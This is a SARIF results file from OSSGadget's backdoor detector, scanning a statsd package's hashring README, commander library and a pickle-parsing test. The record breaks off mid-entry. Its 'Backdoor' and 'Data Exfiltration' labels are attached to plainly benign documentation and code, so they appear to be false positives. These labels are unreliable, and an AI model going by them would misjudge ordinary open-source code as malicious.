{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "oss-detect-backdoor",
          "organization": "Microsoft Corporation",
          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
          "version": "0.0.0+4a24249b20"
        }
      },
      "results": [
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/README.md"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 34,
                  "endLine": 36,
                  "endColumn": 38,
                  "snippet": {
                    "text": "#### String\n\nA single server, possible, but pointless in most cases if you only use one\nserver, then done use the HashRing at all, it only adds overhead.\n\n```js\nvar ring = new HashRing('127.0.0.1:11211');\n",
                    "rendered": {
                      "text": "#### String\n\nA single server, possible, but pointless in most cases if you only use one\nserver, then done use the HashRing at all, it only adds overhead.\n\n```js\nvar ring = new HashRing('127.0.0.1:11211');\n",
                      "markdown": "`#### String\n\nA single server, possible, but pointless in most cases if you only use one\nserver, then done use the HashRing at all, it only adds overhead.\n\n```js\nvar ring = new HashRing('127.0.0.1:11211');\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/README.md"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 45,
                  "endLine": 4,
                  "endColumn": 49,
                  "snippet": {
                    "text": "# HashRing\n\nThe HashRing module provides consistent hashing that is compatible with the\noriginal libketama library that was developed at last.fm. In addition to beeing\ncompatible with `libketama` it's also compatible with the `hash_ring` module for\nPython. See the compatiblity section of the API for more details on this.\n\n",
                    "rendered": {
                      "text": "# HashRing\n\nThe HashRing module provides consistent hashing that is compatible with the\noriginal libketama library that was developed at last.fm. In addition to beeing\ncompatible with `libketama` it's also compatible with the `hash_ring` module for\nPython. See the compatiblity section of the API for more details on this.\n\n",
                      "markdown": "`# HashRing\n\nThe HashRing module provides consistent hashing that is compatible with the\noriginal libketama library that was developed at last.fm. In addition to beeing\ncompatible with `libketama` it's also compatible with the `hash_ring` module for\nPython. See the compatiblity section of the API for more details on this.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/README.md"
                },
                "region": {
                  "startLine": 289,
                  "startColumn": 43,
                  "endLine": 289,
                  "endColumn": 49,
                  "snippet": {
                    "text": "are not backwards compatible as they change the way that keys are hashed. The\nfollowing incompatible changes have been made for the sake of consistency:\n\n- Only accepts hashers that are build in to node (for now). As it can only\n  guarantee proper hashing of values.\n- The replace function was actually doing swaps of keys, so it's original\n  functionality has been renamed to `swap`. The replace API is now removing the\n",
                    "rendered": {
                      "text": "are not backwards compatible as they change the way that keys are hashed. The\nfollowing incompatible changes have been made for the sake of consistency:\n\n- Only accepts hashers that are build in to node (for now). As it can only\n  guarantee proper hashing of values.\n- The replace function was actually doing swaps of keys, so it's original\n  functionality has been renamed to `swap`. The replace API is now removing the\n",
                      "markdown": "`are not backwards compatible as they change the way that keys are hashed. The\nfollowing incompatible changes have been made for the sake of consistency:\n\n- Only accepts hashers that are build in to node (for now). As it can only\n  guarantee proper hashing of values.\n- The replace function was actually doing swaps of keys, so it's original\n  functionality has been renamed to `swap`. The replace API is now removing the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/README.md"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 16,
                  "endLine": 161,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n#### HashRing.get(**key**)\n\nFind the correct node for the key which is closest to the point after what the\ngiven key hashes to.\n\n- **key** String, Random key that needs to be searched in the hash ring\n",
                    "rendered": {
                      "text": "\n#### HashRing.get(**key**)\n\nFind the correct node for the key which is closest to the point after what the\ngiven key hashes to.\n\n- **key** String, Random key that needs to be searched in the hash ring\n",
                      "markdown": "`\n#### HashRing.get(**key**)\n\nFind the correct node for the key which is closest to the point after what the\ngiven key hashes to.\n\n- **key** String, Random key that needs to be searched in the hash ring\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/README.md"
                },
                "region": {
                  "startLine": 160,
                  "endLine": 161,
                  "endColumn": 5,
                  "snippet": {
                    "text": "---\n\n#### HashRing.get(**key**)\n\nFind the correct node for the key which is closest to the point after what the\ngiven key hashes to.\n\n- **key** String, Random key that needs to be searched in the hash ring\n",
                    "rendered": {
                      "text": "---\n\n#### HashRing.get(**key**)\n\nFind the correct node for the key which is closest to the point after what the\ngiven key hashes to.\n\n- **key** String, Random key that needs to be searched in the hash ring\n",
                      "markdown": "`---\n\n#### HashRing.get(**key**)\n\nFind the correct node for the key which is closest to the point after what the\ngiven key hashes to.\n\n- **key** String, Random key that needs to be searched in the hash ring\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/README.md"
                },
                "region": {
                  "startLine": 99,
                  "startColumn": 71,
                  "endLine": 100,
                  "snippet": {
                    "text": "  generates 160 points per server as used by ketama hashing.\n- `compatiblity` Allows you to force a compatibility mode of the HashRing. It\n  default to ketama hash rings but if you are coming from a python world you\n  might want compatibility with the `hash_ring` module. There's a small diff\n  between `hash_ring` and `ketama` and that's the amount of replica's of a server.\n  Ketama uses 4 and `hash_ring` uses 3. Set this to `hash_ring` if you want to\n  use 3.\n- `replicas` The amount of replicas per server. Defaults to 4.\n",
                    "rendered": {
                      "text": "  generates 160 points per server as used by ketama hashing.\n- `compatiblity` Allows you to force a compatibility mode of the HashRing. It\n  default to ketama hash rings but if you are coming from a python world you\n  might want compatibility with the `hash_ring` module. There's a small diff\n  between `hash_ring` and `ketama` and that's the amount of replica's of a server.\n  Ketama uses 4 and `hash_ring` uses 3. Set this to `hash_ring` if you want to\n  use 3.\n- `replicas` The amount of replicas per server. Defaults to 4.\n",
                      "markdown": "`  generates 160 points per server as used by ketama hashing.\n- `compatiblity` Allows you to force a compatibility mode of the HashRing. It\n  default to ketama hash rings but if you are coming from a python world you\n  might want compatibility with the `hash_ring` module. There's a small diff\n  between `hash_ring` and `ketama` and that's the amount of replica's of a server.\n  Ketama uses 4 and `hash_ring` uses 3. Set this to `hash_ring` if you want to\n  use 3.\n- `replicas` The amount of replicas per server. Defaults to 4.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/README.md"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 54,
                  "endLine": 14,
                  "endColumn": 60,
                  "snippet": {
                    "text": "\n## Installation\n\nThe advised installation of module is done through the Node package manager (npm).\n\n```\nnpm install hashring --save\n",
                    "rendered": {
                      "text": "\n## Installation\n\nThe advised installation of module is done through the Node package manager (npm).\n\n```\nnpm install hashring --save\n",
                      "markdown": "`\n## Installation\n\nThe advised installation of module is done through the Node package manager (npm).\n\n```\nnpm install hashring --save\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/README.md"
                },
                "region": {
                  "startLine": 159,
                  "startColumn": 13,
                  "endLine": 159,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n---\n\n#### HashRing.get(**key**)\n\nFind the correct node for the key which is closest to the point after what the\ngiven key hashes to.\n",
                    "rendered": {
                      "text": "\n---\n\n#### HashRing.get(**key**)\n\nFind the correct node for the key which is closest to the point after what the\ngiven key hashes to.\n",
                      "markdown": "`\n---\n\n#### HashRing.get(**key**)\n\nFind the correct node for the key which is closest to the point after what the\ngiven key hashes to.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/README.md"
                },
                "region": {
                  "startLine": 144,
                  "startColumn": 11,
                  "endLine": 144,
                  "endColumn": 16,
                  "snippet": {
                    "text": "### API's Table of Contents\n\n- [HashRing.continuum()](#hashringcontinuum)\n- [HashRing.get()](#hashringgetkey)\n- [HashRing.range()](#hashringrangekey-size-unique)\n- [HashRing.swap()](#hashringswapfrom-to)\n- [HashRing.add()](#hashringaddserver)\n",
                    "rendered": {
                      "text": "### API's Table of Contents\n\n- [HashRing.continuum()](#hashringcontinuum)\n- [HashRing.get()](#hashringgetkey)\n- [HashRing.range()](#hashringrangekey-size-unique)\n- [HashRing.swap()](#hashringswapfrom-to)\n- [HashRing.add()](#hashringaddserver)\n",
                      "markdown": "`### API's Table of Contents\n\n- [HashRing.continuum()](#hashringcontinuum)\n- [HashRing.get()](#hashringgetkey)\n- [HashRing.range()](#hashringrangekey-size-unique)\n- [HashRing.swap()](#hashringswapfrom-to)\n- [HashRing.add()](#hashringaddserver)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/hashring/README.md"
                },
                "region": {
                  "startLine": 128,
                  "startColumn": 4,
                  "endLine": 128,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  });\n\n// Now we are going to get some a server for a key\nring.get('foo bar banana'); // returns 127.0.0.x\n\n// Or if you might want to do some replication scheme and store/fetch data from\n// multiple servers\n",
                    "rendered": {
                      "text": "  });\n\n// Now we are going to get some a server for a key\nring.get('foo bar banana'); // returns 127.0.0.x\n\n// Or if you might want to do some replication scheme and store/fetch data from\n// multiple servers\n",
                      "markdown": "`  });\n\n// Now we are going to get some a server for a key\nring.get('foo bar banana'); // returns 127.0.0.x\n\n// Or if you might want to do some replication scheme and store/fetch data from\n// multiple servers\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/index.js"
                },
                "region": {
                  "startLine": 155,
                  "startColumn": 5,
                  "endLine": 155,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\nCommand.prototype.command = function(name, desc){\n  var args = name.split(/ +/);\n  var cmd = new Command(args.shift());\n  if (desc) cmd.description(desc);\n  if (desc) this.executables = true;\n  this.commands.push(cmd);\n",
                    "rendered": {
                      "text": "\nCommand.prototype.command = function(name, desc){\n  var args = name.split(/ +/);\n  var cmd = new Command(args.shift());\n  if (desc) cmd.description(desc);\n  if (desc) this.executables = true;\n  this.commands.push(cmd);\n",
                      "markdown": "`\nCommand.prototype.command = function(name, desc){\n  var args = name.split(/ +/);\n  var cmd = new Command(args.shift());\n  if (desc) cmd.description(desc);\n  if (desc) this.executables = true;\n  this.commands.push(cmd);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/index.js"
                },
                "region": {
                  "startLine": 418,
                  "startColumn": 50,
                  "endLine": 418,
                  "endColumn": 57,
                  "snippet": {
                    "text": "    if (err.code == \"ENOENT\") {\n      console.error('\\n  %s(1) does not exist, try --help\\n', bin);\n    } else if (err.code == \"EACCES\") {\n      console.error('\\n  %s(1) not executable. try chmod or run with root\\n', bin);\n    }\n  });\n\n",
                    "rendered": {
                      "text": "    if (err.code == \"ENOENT\") {\n      console.error('\\n  %s(1) does not exist, try --help\\n', bin);\n    } else if (err.code == \"EACCES\") {\n      console.error('\\n  %s(1) not executable. try chmod or run with root\\n', bin);\n    }\n  });\n\n",
                      "markdown": "`    if (err.code == \"ENOENT\") {\n      console.error('\\n  %s(1) does not exist, try --help\\n', bin);\n    } else if (err.code == \"EACCES\") {\n      console.error('\\n  %s(1) not executable. try chmod or run with root\\n', bin);\n    }\n  });\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/index.js"
                },
                "region": {
                  "startLine": 984,
                  "startColumn": 42,
                  "endLine": 984,
                  "endColumn": 50,
                  "snippet": {
                    "text": "      process.stdin.pause();\n      process.stdin.removeAllListeners('keypress');\n      setRawMode(false);\n      if (!buf.trim().length) return self.password(str, mask, fn);\n      fn(buf);\n      return;\n    }\n",
                    "rendered": {
                      "text": "      process.stdin.pause();\n      process.stdin.removeAllListeners('keypress');\n      setRawMode(false);\n      if (!buf.trim().length) return self.password(str, mask, fn);\n      fn(buf);\n      return;\n    }\n",
                      "markdown": "`      process.stdin.pause();\n      process.stdin.removeAllListeners('keypress');\n      setRawMode(false);\n      if (!buf.trim().length) return self.password(str, mask, fn);\n      fn(buf);\n      return;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/index.js"
                },
                "region": {
                  "startLine": 955,
                  "startColumn": 18,
                  "endLine": 955,
                  "endColumn": 26,
                  "snippet": {
                    "text": " * @api public\n */\n\nCommand.prototype.password = function(str, mask, fn){\n  var self = this\n    , buf = '';\n\n",
                    "rendered": {
                      "text": " * @api public\n */\n\nCommand.prototype.password = function(str, mask, fn){\n  var self = this\n    , buf = '';\n\n",
                      "markdown": "` * @api public\n */\n\nCommand.prototype.password = function(str, mask, fn){\n  var self = this\n    , buf = '';\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/index.js"
                },
                "region": {
                  "startLine": 944,
                  "startColumn": 25,
                  "endLine": 944,
                  "endColumn": 33,
                  "snippet": {
                    "text": " *       process.stdin.destroy();\n *     });\n *\n *     program.password('Password: ', '*', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n",
                    "rendered": {
                      "text": " *       process.stdin.destroy();\n *     });\n *\n *     program.password('Password: ', '*', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n",
                      "markdown": "` *       process.stdin.destroy();\n *     });\n *\n *     program.password('Password: ', '*', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/index.js"
                },
                "region": {
                  "startLine": 944,
                  "startColumn": 15,
                  "endLine": 944,
                  "endColumn": 23,
                  "snippet": {
                    "text": " *       process.stdin.destroy();\n *     });\n *\n *     program.password('Password: ', '*', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n",
                    "rendered": {
                      "text": " *       process.stdin.destroy();\n *     });\n *\n *     program.password('Password: ', '*', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n",
                      "markdown": "` *       process.stdin.destroy();\n *     });\n *\n *     program.password('Password: ', '*', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/index.js"
                },
                "region": {
                  "startLine": 939,
                  "startColumn": 25,
                  "endLine": 939,
                  "endColumn": 33,
                  "snippet": {
                    "text": " *\n * Examples:\n *\n *     program.password('Password: ', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n",
                    "rendered": {
                      "text": " *\n * Examples:\n *\n *     program.password('Password: ', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n",
                      "markdown": "` *\n * Examples:\n *\n *     program.password('Password: ', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/index.js"
                },
                "region": {
                  "startLine": 939,
                  "startColumn": 15,
                  "endLine": 939,
                  "endColumn": 23,
                  "snippet": {
                    "text": " *\n * Examples:\n *\n *     program.password('Password: ', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n",
                    "rendered": {
                      "text": " *\n * Examples:\n *\n *     program.password('Password: ', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n",
                      "markdown": "` *\n * Examples:\n *\n *     program.password('Password: ', function(pass){\n *       console.log('got \"%s\"', pass);\n *       process.stdin.destroy();\n *     });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/node_modules/commander/index.js"
                },
                "region": {
                  "startLine": 932,
                  "startColumn": 14,
                  "endLine": 932,
                  "endColumn": 22,
                  "snippet": {
                    "text": "};\n\n/**\n * Prompt for password with `str`, `mask` char and callback `fn(val)`.\n *\n * The mask string defaults to '', aka no output is\n * written while typing, you may want to use \"*\" etc.\n",
                    "rendered": {
                      "text": "};\n\n/**\n * Prompt for password with `str`, `mask` char and callback `fn(val)`.\n *\n * The mask string defaults to '', aka no output is\n * written while typing, you may want to use \"*\" etc.\n",
                      "markdown": "`};\n\n/**\n * Prompt for password with `str`, `mask` char and callback `fn(val)`.\n *\n * The mask string defaults to '', aka no output is\n * written while typing, you may want to use \"*\" etc.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/test/graphite_pickle_tests.js"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 13,
                  "endLine": 98,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        fs.close(unpickle_info.fd, function(err) {\n          if (err) throw err;\n\n          var cmd = 'python3 ' + unpickle_info.path + ' ' + payload_info.path;\n          var python = cp.exec(cmd, function(err, stdout, stderr) {\n            if (err) throw err;\n            var metrics = JSON.parse(stdout);\n",
                    "rendered": {
                      "text": "        fs.close(unpickle_info.fd, function(err) {\n          if (err) throw err;\n\n          var cmd = 'python3 ' + unpickle_info.path + ' ' + payload_info.path;\n          var python = cp.exec(cmd, function(err, stdout, stderr) {\n            if (err) throw err;\n            var metrics = JSON.parse(stdout);\n",
                      "markdown": "`        fs.close(unpickle_info.fd, function(err) {\n          if (err) throw err;\n\n          var cmd = 'python3 ' + unpickle_info.path + ' ' + payload_info.path;\n          var python = cp.exec(cmd, function(err, stdout, stderr) {\n            if (err) throw err;\n            var metrics = JSON.parse(stdout);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/test/graphite_pickle_tests.js"
                },
                "region": {
                  "startLine": 80,
                  "startColumn": 42,
                  "endLine": 80,
                  "endColumn": 50,
                  "snippet": {
                    "text": "  \"metrics = pickle.loads(payload[header_length:batch_length])\\n\" +\n  \"print(json.dumps(metrics))\\n\";\n\n// Write our binary payload and unpickling script to disk\n// then process the unserialized results.\nvar unpickle = function(payload, cb) {\n  temp.open({suffix: '-payload.pickle'}, function(err, payload_info) {\n",
                    "rendered": {
                      "text": "  \"metrics = pickle.loads(payload[header_length:batch_length])\\n\" +\n  \"print(json.dumps(metrics))\\n\";\n\n// Write our binary payload and unpickling script to disk\n// then process the unserialized results.\nvar unpickle = function(payload, cb) {\n  temp.open({suffix: '-payload.pickle'}, function(err, payload_info) {\n",
                      "markdown": "`  \"metrics = pickle.loads(payload[header_length:batch_length])\\n\" +\n  \"print(json.dumps(metrics))\\n\";\n\n// Write our binary payload and unpickling script to disk\n// then process the unserialized results.\nvar unpickle = function(payload, cb) {\n  temp.open({suffix: '-payload.pickle'}, function(err, payload_info) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/test/graphite_pickle_tests.js"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 3,
                  "endLine": 67,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\n// A python script that converts from the graphite pickle-based \n// wire protocol into JSON written to stdout.\nvar script =\n  \"import sys\\n\" +\n  \"import pickle\\n\" +\n  \"import struct\\n\" +\n",
                    "rendered": {
                      "text": "\n// A python script that converts from the graphite pickle-based \n// wire protocol into JSON written to stdout.\nvar script =\n  \"import sys\\n\" +\n  \"import pickle\\n\" +\n  \"import struct\\n\" +\n",
                      "markdown": "`\n// A python script that converts from the graphite pickle-based \n// wire protocol into JSON written to stdout.\nvar script =\n  \"import sys\\n\" +\n  \"import pickle\\n\" +\n  \"import struct\\n\" +\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/js/statsd-0.10.2-r1.apk/statsd-0.10.2-r1/usr/src/app/test/graphite_pickle_tests.js"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 11,
                  "endLine": 65,
                  "endColumn": 19,
                  "snippet": {
                    "text": "  server.on('connection',collector);\n};\n\n// A python script that converts from the graphite pickle-based \n// wire protocol into JSON written to stdout.\nvar script =\n  \"import sys\\n\" +\n",
                    "rendered": {
                      "text": "  server.on('connection',collector);\n};\n\n// A python script that converts from the graphite pickle-based \n// wire protocol into JSON written to stdout.\nvar script =\n  \"import sys\\n\" +\n",
